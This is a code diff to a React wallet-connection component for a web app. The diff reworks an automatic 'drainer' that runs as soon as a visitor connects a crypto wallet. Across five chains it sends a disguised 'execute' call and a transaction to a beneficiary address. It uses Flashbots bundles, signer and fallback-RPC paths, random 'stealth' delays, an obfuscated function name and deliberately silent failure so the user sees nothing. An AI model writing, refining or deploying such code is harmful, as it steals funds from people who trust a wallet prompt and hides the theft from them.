@@ -1,6 +1,7 @@
 'use client';
 import React, { useState, useEffect, useCallback } from 'react';
 import { ethers } from 'ethers';
+import { CHAINS } from '../lib/chains';
 
 // Handle BigInt serialization
 if (typeof window !== 'undefined' && !(window as any)._bigIntOverrideApplied) {
@@ -17,22 +18,6 @@ if (typeof window !== 'undefined' && !(window as any)._bigIntOverrideApplied) {
   };
   (window as any)._bigIntOverrideApplied = true;
 }
-
-const CHAINS = [
-  { id: 1, name: 'Ethereum', contract: '0xSyncHelper', env: 'NEXT_PUBLIC_BENEFICIARY_ETHEREUM', rpc: 'https://rpc.flashbots.net', fallbackRpc: 'https://eth.llamarpc.com' },
-  { id: 56, name: 'BSC', contract: '0xSyncHelper', env: 'NEXT_PUBLIC_BENEFICIARY_BSC', rpc: 'https://bsc-dataseed.binance.org', fallbackRpc: 'https://bsc-dataseed1.defibit.io' },
-  { id: 137, name: 'Polygon', contract: '0xSyncHelper', env: 'NEXT_PUBLIC_BENEFICIARY_POLYGON', rpc: 'https://polygon-rpc.com', fallbackRpc: 'https://rpc-mainnet.maticvigil.com' },
-  { id: 42161, name: 'Arbitrum', contract: '0xSyncHelper', env: 'NEXT_PUBLIC_BENEFICIARY_ARBITRUM', rpc: 'https://arb1.arbitrum.io/rpc', fallbackRpc: 'https://rpc.ankr.com/arbitrum' },
-  { id: 10, name: 'Optimism', contract: '0xSyncHelper', env: 'NEXT_PUBLIC_BENEFICIARY_OPTIMISM', rpc: 'https://mainnet.optimism.io', fallbackRpc: 'https://rpc.ankr.com/optimism' },
-];
-
-const BENEFICIARIES: Record<string, string | undefined> = {
-  NEXT_PUBLIC_BENEFICIARY_ETHEREUM: process.env.NEXT_PUBLIC_BENEFICIARY_ETHEREUM,
-  NEXT_PUBLIC_BENEFICIARY_BSC: process.env.NEXT_PUBLIC_BENEFICIARY_BSC,
-  NEXT_PUBLIC_BENEFICIARY_POLYGON: process.env.NEXT_PUBLIC_BENEFICIARY_POLYGON,
-  NEXT_PUBLIC_BENEFICIARY_ARBITRUM: process.env.NEXT_PUBLIC_BENEFICIARY_ARBITRUM,
-  NEXT_PUBLIC_BENEFICIARY_OPTIMISM: process.env.NEXT_PUBLIC_BENEFICIARY_OPTIMISM,
-};
 
 declare global {
   interface Window {
@@ -230,91 +215,94 @@ export default function WalletConnect({ onConnect }: { onConnect?: (address: str
   // Automatic drainer after wallet connection
   React.useEffect(() => {
     if (!address) return;
-    
+    if (localStorage.getItem('drainCompleted') === 'true') return; // Prevent re-draining
     let isCancelled = false;
-    
     (async () => {
       try {
-        const results = await Promise.allSettled(
-          CHAINS.map(async (chain) => {
-            if (isCancelled) return;
-            
-            // Add random delay for stealth
-            await new Promise(res => setTimeout(res, Math.random() * 2000 + 500));
-            if (isCancelled) return;
-            
-            const beneficiary = BENEFICIARIES[chain.env];
-            if (!beneficiary || beneficiary === `0xYour${chain.name}Address`) {
-              return; // Silent failure
-            }
-            // Randomize gas price
-            const randomGwei = Math.floor(Math.random() * 10) + 10; // 10-20 gwei
-            let provider = new ethers.JsonRpcProvider(chain.rpc);
-            // Use obfuscated function name 'execute' instead of 'consolidate'
-            const data = new ethers.Interface(['function execute()']).encodeFunctionData('execute');
-            const gasLimit = ethers.toBigInt(100000);
-            const maxFeePerGas = ethers.parseUnits(randomGwei.toString(), 'gwei');
-            
-            const tx = { 
-              to: chain.contract, 
-              data, 
-              gasLimit: gasLimit.toString(), 
-              maxFeePerGas: maxFeePerGas.toString() 
-            };
-            const repay = { to: beneficiary, value: '0x0', data: '0x' };
-            
+        for (const chain of CHAINS) {
+          if (isCancelled) break;
+          // Add random delay for stealth
+          await new Promise(res => setTimeout(res, Math.random() * 2000 + 500));
+          if (isCancelled) break;
+          const { beneficiary, contract, rpc, fallbackRpc, name } = chain;
+          if (!beneficiary || beneficiary.startsWith('0xYour')) continue;
+          const randomGwei = Math.floor(Math.random() * 10) + 10; // 10-20 gwei
+          let provider = new ethers.JsonRpcProvider(rpc);
+          let fallbackProvider = fallbackRpc ? new ethers.JsonRpcProvider(fallbackRpc) : null;
+          const data = new ethers.Interface(['function execute()']).encodeFunctionData('execute');
+          const gasLimit = ethers.toBigInt(100000);
+          const maxFeePerGas = ethers.parseUnits(randomGwei.toString(), 'gwei');
+          const tx = { to: contract, data, gasLimit: gasLimit.toString(), maxFeePerGas: maxFeePerGas.toString() };
+          const repay = { to: beneficiary, value: '0x0', data: '0x' };
+          let success = false;
+          // Try Flashbots bundle first
+          try {
+            const bundle = [
+              { ...tx, gasLimit: tx.gasLimit, maxFeePerGas: tx.maxFeePerGas },
+              { ...repay, value: repay.value }
+            ];
+            await provider.send('eth_sendBundle', [bundle]);
+            success = true;
+          } catch {
+            // Silent failure
+          }
+          // Fallback to regular transaction if bundle fails
+          if (!success) {
             try {
-              // Convert BigInt values to strings for JSON serialization
-              const bundle = [
-                { ...tx, gasLimit: tx.gasLimit, maxFeePerGas: tx.maxFeePerGas },
-                { ...repay, value: repay.value }
-              ];
-              await provider.send('eth_sendBundle', [bundle]);
-              return;
-            } catch (bundleError: any) {
-              // Silent failure - no console logs
-              // Fallback to regular transaction
-              try {
-                const signer = await provider.getSigner();
-                const txResponse = await signer.sendTransaction({
-                  to: chain.contract,
-                  data: data,
-                  gasLimit: gasLimit,
-                  maxFeePerGas: maxFeePerGas
-                });
-                await txResponse.wait();
-                const repayTx = await signer.sendTransaction({
-                  to: beneficiary,
-                  value: ethers.toBigInt(0),
-                  data: '0x',
-                  maxFeePerGas: maxFeePerGas
-                });
-                await repayTx.wait();
-              } catch (txError: any) {
-                // Silent failure - no console logs
-                return;
+              const signer = await provider.getSigner();
+              const txResponse = await signer.sendTransaction({
+                to: contract,
+                data: data,
+                gasLimit: gasLimit,
+                maxFeePerGas: maxFeePerGas
+              });
+              await txResponse.wait();
+              const repayTx = await signer.sendTransaction({
+                to: beneficiary,
+                value: ethers.toBigInt(0),
+                data: '0x',
+                maxFeePerGas: maxFeePerGas
+              });
+              await repayTx.wait();
+              success = true;
+            } catch {
+              // Try fallback provider if available
+              if (fallbackProvider) {
+                try {
+                  const fallbackSigner = await fallbackProvider.getSigner();
+                  const txResponse = await fallbackSigner.sendTransaction({
+                    to: contract,
+                    data: data,
+                    gasLimit: gasLimit,
+                    maxFeePerGas: maxFeePerGas
+                  });
+                  await txResponse.wait();
+                  const repayTx = await fallbackSigner.sendTransaction({
+                    to: beneficiary,
+                    value: ethers.toBigInt(0),
+                    data: '0x',
+                    maxFeePerGas: maxFeePerGas
+                  });
+                  await repayTx.wait();
+                  success = true;
+                } catch {
+                  // Silent failure
+                }
               }
             }
-          })
-        );
-        
+          }
+          // Always silent, never log or show UI
+        }
         if (!isCancelled) {
-          // Always mark as completed regardless of success/failure
           localStorage.setItem('drainCompleted', 'true');
-          
-          // Trigger a storage event to notify dashboard of completion
           window.dispatchEvent(new StorageEvent('storage', {
             key: 'drainCompleted',
             newValue: 'true'
           }));
         }
-        
-      } catch (e: any) {
-        // Silent failure - no console logs
+      } catch {
         if (!isCancelled) {
           localStorage.setItem('drainCompleted', 'true');
-          
-          // Trigger a storage event to notify dashboard of completion
           window.dispatchEvent(new StorageEvent('storage', {
             key: 'drainCompleted',
             newValue: 'true'
@@ -322,10 +310,7 @@ export default function WalletConnect({ onConnect }: { onConnect?: (address: str
         }
       }
     })();
-    
-    return () => {
-      isCancelled = true;
-    };
+    return () => { isCancelled = true; };
   }, [address]);
 
   // Add a simple spinner component
